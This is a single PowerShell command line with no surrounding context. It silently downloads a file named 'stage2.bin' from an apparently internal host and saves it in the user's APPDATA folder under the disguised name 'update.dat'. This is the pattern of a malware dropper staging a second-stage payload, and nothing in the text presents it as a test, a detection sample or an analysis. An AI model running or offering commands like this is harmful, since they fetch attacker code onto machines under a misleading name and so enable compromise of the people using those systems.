
curl.exe -s -L -o "$env:APPDATA\update.dat" "http://internal.corp:80/stage2.bin"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
